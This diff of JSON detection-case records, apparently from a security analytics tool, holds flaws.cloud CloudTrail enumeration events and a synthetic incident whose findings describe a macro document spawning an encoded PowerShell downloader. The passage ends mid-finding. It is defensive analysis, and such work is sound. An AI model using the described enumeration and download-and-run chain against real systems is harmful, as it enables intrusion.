+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 137.53.124.9 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/service-role/Level6"
+    },
+    "cloudtrail-logon-000146": {
+     "timestamp": "2017-02-28 08:01:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 137.53.124.9 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/service-role/Level6"
+    }
+   }
+  },
+  {
+   "corpus": "flaws_cloud",
+   "case_id": "CASE-219",
+   "rebuilt": true,
+   "severity": "HIGH",
+   "rule_ids": [
+    "AWS-003",
+    "AWS-004"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-003:cloudtrail-control-1776510",
+     "rule_id": "AWS-003",
+     "title": "Cloud service discovery burst",
+     "severity": "HIGH",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "reason": "'i-aa2d3b42e5c6e801a' made 2712 read calls across 105 distinct services in 580s, 2637 of them refused for want of authority (97%). Breadth with no permission behind it is enumeration rather than administration. The rule counts how many services were read, not which, so it cannot say whether the target was the account's service inventory or its infrastructure.",
+     "event_ids": [
+      "cloudtrail-control-1776510",
+      "cloudtrail-control-1776511",
+      "cloudtrail-control-1776513",
+      "cloudtrail-control-1776514",
+      "cloudtrail-control-1776515",
+      "cloudtrail-control-1776516",
+      "cloudtrail-control-1776517",
+      "cloudtrail-control-1776518",
+      "cloudtrail-control-1776521",
+      "cloudtrail-control-1776522",
+      "cloudtrail-control-1776524",
+      "cloudtrail-control-1776525",
+      "cloudtrail-control-1776528",
+      "cloudtrail-control-1776531",
+      "cloudtrail-control-1776545",
+      "cloudtrail-control-1776552",
+      "cloudtrail-control-1776556",
+      "cloudtrail-control-1776571",
+      "cloudtrail-control-1776597",
+      "cloudtrail-control-1776608"
+     ]
+    },
+    {
+     "finding_id": "AWS-004:cloudtrail-control-1776510",
+     "rule_id": "AWS-004",
+     "title": "Authorization-denial burst",
+     "severity": "HIGH",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "reason": "'i-aa2d3b42e5c6e801a' was refused authorization 2637 times in 580s, across 621 distinct resource types. Refusals spread across this many kinds of object are consistent with a caller establishing what its credential can reach. A refusal says what the platform would not do; it does not say what the caller intended.",
+     "event_ids": [
+      "cloudtrail-control-1776510",
+      "cloudtrail-control-1776513",
+      "cloudtrail-control-1776514",
+      "cloudtrail-control-1776515",
+      "cloudtrail-control-1776516",
+      "cloudtrail-control-1776517",
+      "cloudtrail-control-1776518",
+      "cloudtrail-control-1776519",
+      "cloudtrail-control-1776520",
+      "cloudtrail-control-1776522",
+      "cloudtrail-control-1776523",
+      "cloudtrail-control-1776524",
+      "cloudtrail-control-1776525",
+      "cloudtrail-control-1776526",
+      "cloudtrail-control-1776527",
+      "cloudtrail-control-1776528",
+      "cloudtrail-control-1776529",
+      "cloudtrail-control-1776530",
+      "cloudtrail-control-1776531",
+      "cloudtrail-control-1776532"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-1776510",
+    "cloudtrail-control-1776511",
+    "cloudtrail-control-1776513",
+    "cloudtrail-control-1776514",
+    "cloudtrail-control-1776515",
+    "cloudtrail-control-1776516",
+    "cloudtrail-control-1776517",
+    "cloudtrail-control-1776518",
+    "cloudtrail-control-1776519",
+    "cloudtrail-control-1776520",
+    "cloudtrail-control-1776521",
+    "cloudtrail-control-1776522",
+    "cloudtrail-control-1776523",
+    "cloudtrail-control-1776524",
+    "cloudtrail-control-1776525",
+    "cloudtrail-control-1776526",
+    "cloudtrail-control-1776527",
+    "cloudtrail-control-1776528",
+    "cloudtrail-control-1776529",
+    "cloudtrail-control-1776530",
+    "cloudtrail-control-1776531",
+    "cloudtrail-control-1776532",
+    "cloudtrail-control-1776545",
+    "cloudtrail-control-1776552",
+    "cloudtrail-control-1776556",
+    "cloudtrail-control-1776571",
+    "cloudtrail-control-1776597",
+    "cloudtrail-control-1776608"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-1776510": {
+     "timestamp": "2020-06-11 21:47:49+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list snowball:cluster [denied]"
+    },
+    "cloudtrail-control-1776511": {
+     "timestamp": "2020-06-11 21:47:49+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list mediaconnect:entitlement [failed]"
+    },
+    "cloudtrail-control-1776513": {
+     "timestamp": "2020-06-11 21:47:49+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list inspector:rules-package [denied]"
+    },
+    "cloudtrail-control-1776514": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list cloudfront:distribution [denied]"
+    },
+    "cloudtrail-control-1776515": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list rekognition:collection [denied]"
+    },
+    "cloudtrail-control-1776516": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list mediapackage:channel [denied]"
+    },
+    "cloudtrail-control-1776517": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a describe discovery:export-configuration [denied]"
+    },
+    "cloudtrail-control-1776518": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a describe ec2:vpc-endpoint-connection-notification [denied]"
+    },
+    "cloudtrail-control-1776519": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list cloudfront:field-level-encryption-config [denied]"
+    },
+    "cloudtrail-control-1776520": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list cloudfront:streaming-distribution [denied]"
+    },
+    "cloudtrail-control-1776521": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a describe elasticbeanstalk:environment-resource [failed]"
+    },
+    "cloudtrail-control-1776522": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a describe gamelift:vpc-peering-authorization [denied]"
+    },
+    "cloudtrail-control-1776523": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a describe ec2:vpc-endpoint-service [denied]"
+    },
+    "cloudtrail-control-1776524": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a describe kms:custom-key-store [denied]"
+    },
+    "cloudtrail-control-1776525": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a get glue:catalog-import-status [denied]"
+    },
+    "cloudtrail-control-1776526": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list rekognition:stream-processor [denied]"
+    },
+    "cloudtrail-control-1776527": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list gamelift:fleet [denied]"
+    },
+    "cloudtrail-control-1776528": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list route53:hosted-zone [denied]"
+    },
+    "cloudtrail-control-1776529": {
+     "timestamp": "2020-06-11 21:47:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list route53:health-check [denied]"
+    },
+    "cloudtrail-control-1776530": {
+     "timestamp": "2020-06-11 21:47:51+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a get glue:database [denied]"
+    },
+    "cloudtrail-control-1776531": {
+     "timestamp": "2020-06-11 21:47:51+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list amazonmq:broker [denied]"
+    },
+    "cloudtrail-control-1776532": {
+     "timestamp": "2020-06-11 21:47:51+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a describe elasticbeanstalk:account-attribute [denied]"
+    },
+    "cloudtrail-control-1776545": {
+     "timestamp": "2020-06-11 21:47:51+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list appsync:graphql-apis [denied]"
+    },
+    "cloudtrail-control-1776552": {
+     "timestamp": "2020-06-11 21:47:51+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list amplify:app [denied]"
+    },
+    "cloudtrail-control-1776556": {
+     "timestamp": "2020-06-11 21:47:51+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list route53domains:domain [denied]"
+    },
+    "cloudtrail-control-1776571": {
+     "timestamp": "2020-06-11 21:47:52+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list datapipeline:pipeline [denied]"
+    },
+    "cloudtrail-control-1776597": {
+     "timestamp": "2020-06-11 21:47:53+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list iotanalytics:datastore [denied]"
+    },
+    "cloudtrail-control-1776608": {
+     "timestamp": "2020-06-11 21:47:53+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "control",
+     "summary": "i-aa2d3b42e5c6e801a list firehose:delivery-stream [denied]"
+    },
+    "cloudtrail-logon-011279": {
+     "timestamp": "2017-08-18 14:38:10+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 110.253.2.0 reason=User: arn:aws:sts::811596193553:assumed-role/flaws/i-aa2d3b42e5c6e801a is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/flaws"
+    },
+    "cloudtrail-logon-018208": {
+     "timestamp": "2018-02-24 13:30:14+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 245.181.7.4 reason=Not authorized to perform sts:AssumeRole"
+    },
+    "cloudtrail-logon-047152": {
+     "timestamp": "2019-03-26 18:54:34+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 4.225.0.1 reason=An unknown error occurred"
+    },
+    "cloudtrail-logon-057799": {
+     "timestamp": "2019-09-18 04:27:58+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 3.10.240.206"
+    },
+    "cloudtrail-logon-072441": {
+     "timestamp": "2020-06-10 22:44:35+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 251.105.254.1 reason=An unknown error occurred"
+    },
+    "cloudtrail-logon-072502": {
+     "timestamp": "2020-06-11 21:40:01+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 251.105.254.1 reason=An unknown error occurred"
+    },
+    "cloudtrail-logon-079343": {
+     "timestamp": "2020-10-06 16:39:53+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "i-aa2d3b42e5c6e801a",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 0.0.58.4 reason=An unknown error occurred"
+    }
+   }
+  },
+  {
+   "corpus": "flaws_cloud",
+   "case_id": "CASE-256",
+   "rebuilt": true,
+   "severity": "HIGH",
+   "rule_ids": [
+    "AWS-003",
+    "AWS-004"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-003:cloudtrail-control-1817072",
+     "rule_id": "AWS-003",
+     "title": "Cloud service discovery burst",
+     "severity": "MEDIUM",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "reason": "'Level6' made 671 read calls across 21 distinct services in 550s, 196 of them refused (29%). Breadth on this scale is consistent with account enumeration, and is also exactly what inventory and compliance tooling does. The rule counts how many services were read, not which, so it cannot say whether the target was the account's service inventory or its infrastructure.",
+     "event_ids": [
+      "cloudtrail-control-1817072",
+      "cloudtrail-control-1817082",
+      "cloudtrail-control-1817085",
+      "cloudtrail-control-1817088",
+      "cloudtrail-control-1817159",
+      "cloudtrail-control-1817175",
+      "cloudtrail-control-1817217",
+      "cloudtrail-control-1817317",
+      "cloudtrail-control-1817318",
+      "cloudtrail-control-1817321",
+      "cloudtrail-control-1817323",
+      "cloudtrail-control-1817324",
+      "cloudtrail-control-1817351",
+      "cloudtrail-control-1817352",
+      "cloudtrail-control-1817356",
+      "cloudtrail-control-1817358",
+      "cloudtrail-control-1817359",
+      "cloudtrail-control-1817361",
+      "cloudtrail-control-1817365",
+      "cloudtrail-control-1817368"
+     ]
+    },
+    {
+     "finding_id": "AWS-004:cloudtrail-control-1817217",
+     "rule_id": "AWS-004",
+     "title": "Authorization-denial burst",
+     "severity": "HIGH",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "reason": "'Level6' was refused authorization 196 times in 241s, across 17 distinct resource types. Refusals spread across this many kinds of object are consistent with a caller establishing what its credential can reach. A refusal says what the platform would not do; it does not say what the caller intended.",
+     "event_ids": [
+      "cloudtrail-control-1817217",
+      "cloudtrail-control-1817246",
+      "cloudtrail-control-1817318",
+      "cloudtrail-control-1817322",
+      "cloudtrail-control-1817358",
+      "cloudtrail-control-1817365",
+      "cloudtrail-control-1817368",
+      "cloudtrail-control-1817369",
+      "cloudtrail-control-1817371",
+      "cloudtrail-control-1817372",
+      "cloudtrail-control-1817373",
+      "cloudtrail-control-1817374",
+      "cloudtrail-control-1817375",
+      "cloudtrail-control-1817376",
+      "cloudtrail-control-1817377",
+      "cloudtrail-control-1817378",
+      "cloudtrail-control-1817466"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-1817072",
+    "cloudtrail-control-1817082",
+    "cloudtrail-control-1817085",
+    "cloudtrail-control-1817088",
+    "cloudtrail-control-1817159",
+    "cloudtrail-control-1817175",
+    "cloudtrail-control-1817217",
+    "cloudtrail-control-1817246",
+    "cloudtrail-control-1817317",
+    "cloudtrail-control-1817318",
+    "cloudtrail-control-1817321",
+    "cloudtrail-control-1817322",
+    "cloudtrail-control-1817323",
+    "cloudtrail-control-1817324",
+    "cloudtrail-control-1817351",
+    "cloudtrail-control-1817352",
+    "cloudtrail-control-1817356",
+    "cloudtrail-control-1817358",
+    "cloudtrail-control-1817359",
+    "cloudtrail-control-1817361",
+    "cloudtrail-control-1817365",
+    "cloudtrail-control-1817368",
+    "cloudtrail-control-1817369",
+    "cloudtrail-control-1817371",
+    "cloudtrail-control-1817372",
+    "cloudtrail-control-1817373",
+    "cloudtrail-control-1817374",
+    "cloudtrail-control-1817375",
+    "cloudtrail-control-1817376",
+    "cloudtrail-control-1817377",
+    "cloudtrail-control-1817378",
+    "cloudtrail-control-1817466"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-1817072": {
+     "timestamp": "2020-09-21 03:54:58+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list iam:user [allowed]"
+    },
+    "cloudtrail-control-1817082": {
+     "timestamp": "2020-09-21 03:55:05+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe ec2:instance [allowed]"
+    },
+    "cloudtrail-control-1817085": {
+     "timestamp": "2020-09-21 03:55:08+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe rds:db-instance [allowed]"
+    },
+    "cloudtrail-control-1817088": {
+     "timestamp": "2020-09-21 03:55:10+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get sts:caller-identity [allowed]"
+    },
+    "cloudtrail-control-1817159": {
+     "timestamp": "2020-09-21 03:55:41+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe cloudformation:stack [allowed]"
+    },
+    "cloudtrail-control-1817175": {
+     "timestamp": "2020-09-21 03:56:19+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list lambda:function [allowed]"
+    },
+    "cloudtrail-control-1817217": {
+     "timestamp": "2020-09-21 04:00:07+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:account-public-access-block [denied]"
+    },
+    "cloudtrail-control-1817246": {
+     "timestamp": "2020-09-21 04:00:23+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-location (level4-974134b52e7c35aebcc4b45f19113936.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-1817317": {
+     "timestamp": "2020-09-21 04:00:40+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe cloudtrail:trail [allowed]"
+    },
+    "cloudtrail-control-1817318": {
+     "timestamp": "2020-09-21 04:00:40+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe config:config-rule [denied]"
+    },
+    "cloudtrail-control-1817321": {
+     "timestamp": "2020-09-21 04:00:40+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe monitoring:alarm [allowed]"
+    },
+    "cloudtrail-control-1817322": {
+     "timestamp": "2020-09-21 04:00:40+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe config:configuration-recorder [denied]"
+    },
+    "cloudtrail-control-1817323": {
+     "timestamp": "2020-09-21 04:00:40+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list acm:certificate [allowed]"
+    },
+    "cloudtrail-control-1817324": {
+     "timestamp": "2020-09-21 04:00:40+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe directconnect:connection [allowed]"
+    },
+    "cloudtrail-control-1817351": {
+     "timestamp": "2020-09-21 04:00:42+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe elasticloadbalancing:load-balancer [allowed]"
+    },
+    "cloudtrail-control-1817352": {
+     "timestamp": "2020-09-21 04:00:42+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe elasticfilesystem:file-system [allowed]"
+    },
+    "cloudtrail-control-1817356": {
+     "timestamp": "2020-09-21 04:00:43+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list kms:key [allowed]"
+    },
+    "cloudtrail-control-1817358": {
+     "timestamp": "2020-09-21 04:00:43+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list sns:topic [denied]"
+    },
+    "cloudtrail-control-1817359": {
+     "timestamp": "2020-09-21 04:00:43+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe redshift:cluster-security-group [allowed]"
+    },
+    "cloudtrail-control-1817361": {
+     "timestamp": "2020-09-21 04:00:43+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe elasticache:cache-parameter-group [allowed]"
+    },
+    "cloudtrail-control-1817365": {
+     "timestamp": "2020-09-21 04:00:43+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list ses:identity [denied]"
+    },
+    "cloudtrail-control-1817368": {
+     "timestamp": "2020-09-21 04:00:44+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list secretsmanager:secret [denied]"
+    },
+    "cloudtrail-control-1817369": {
+     "timestamp": "2020-09-21 04:00:44+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe config:configuration-recorder-status [denied]"
+    },
+    "cloudtrail-control-1817371": {
+     "timestamp": "2020-09-21 04:00:45+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-tagging (b5677c799b465420d8e7b0a6689a0bb0c4afbc9e.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-1817372": {
+     "timestamp": "2020-09-21 04:00:45+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-versioning (b5677c799b465420d8e7b0a6689a0bb0c4afbc9e.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-1817373": {
+     "timestamp": "2020-09-21 04:00:45+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-policy (b5677c799b465420d8e7b0a6689a0bb0c4afbc9e.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-1817374": {
+     "timestamp": "2020-09-21 04:00:45+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-public-access-block (b5677c799b465420d8e7b0a6689a0bb0c4afbc9e.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-1817375": {
+     "timestamp": "2020-09-21 04:00:45+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-website (b5677c799b465420d8e7b0a6689a0bb0c4afbc9e.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-1817376": {
+     "timestamp": "2020-09-21 04:00:45+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-logging (b5677c799b465420d8e7b0a6689a0bb0c4afbc9e.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-1817377": {
+     "timestamp": "2020-09-21 04:00:45+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-acl (b5677c799b465420d8e7b0a6689a0bb0c4afbc9e.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-1817378": {
+     "timestamp": "2020-09-21 04:00:45+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-encryption (b5677c799b465420d8e7b0a6689a0bb0c4afbc9e.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-1817466": {
+     "timestamp": "2020-09-21 04:00:51+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get kms:key-policy [denied]"
+    },
+    "cloudtrail-logon-000144": {
+     "timestamp": "2017-02-28 07:58:45+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 137.53.124.9"
+    },
+    "cloudtrail-logon-000145": {
+     "timestamp": "2017-02-28 08:01:21+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 137.53.124.9 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/service-role/Level6"
+    },
+    "cloudtrail-logon-018192": {
+     "timestamp": "2018-02-24 12:49:58+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 245.181.7.4 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/service-role/Level6"
+    },
+    "cloudtrail-logon-046949": {
+     "timestamp": "2019-03-07 20:35:36+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 2.231.90.242 reason=Not authorized to perform sts:AssumeRole"
+    }
+   }
+  },
+  {
+   "corpus": "synthetic:INC-001",
+   "case_id": "CASE-001",
+   "rebuilt": true,
+   "severity": "CRITICAL",
+   "rule_ids": [
+    "ATH-001",
+    "ATH-002",
+    "ATH-003",
+    "ATH-004",
+    "ATH-005",
+    "ATH-006",
+    "ATH-007",
+    "ATH-008",
+    "ATH-009",
+    "ATH-010"
+   ],
+   "findings": [
+    {
+     "finding_id": "ATH-009:evt-000355",
+     "rule_id": "ATH-009",
+     "title": "Macro-enabled document opened via email client",
+     "severity": "MEDIUM",
+     "device": "PC01",
+     "actor": "jdoe",
+     "reason": "Outlook launched WINWORD.EXE to open a document in a macro-capable format. This is consistent with a malicious attachment being opened, independent of whether any embedded macro subsequently ran.",
+     "event_ids": [
+      "evt-000355"
+     ]
+    },
+    {
+     "finding_id": "ATH-001:evt-000357",
+     "rule_id": "ATH-001",
+     "title": "Office application spawned a script interpreter",
+     "severity": "HIGH",
+     "device": "PC01",
+     "actor": "jdoe",
+     "reason": "WINWORD.EXE started powershell.exe. Office applications have no routine need to launch script interpreters; this parent/child relationship is consistent with macro-based code execution from a document.",
+     "event_ids": [
+      "evt-000357"
+     ]
+    },
+    {
+     "finding_id": "ATH-002:evt-000357",
+     "rule_id": "ATH-002",
+     "title": "Encoded PowerShell command execution",
+     "severity": "HIGH",
+     "device": "PC01",
+     "actor": "jdoe",
+     "reason": "PowerShell ran a base64-encoded command. The decoded payload retrieves and executes remote content, which is consistent with a first-stage downloader. Evasion flags observed: hidden window, no profile.",
+     "event_ids": [
+      "evt-000357"
+     ]
+    },
+    {
+     "finding_id": "ATH-003:evt-000358",
+     "rule_id": "ATH-003",
+     "title": "Script interpreter connected to an external host",
+     "severity": "HIGH",
+     "device": "PC01",
+     "actor": "jdoe",
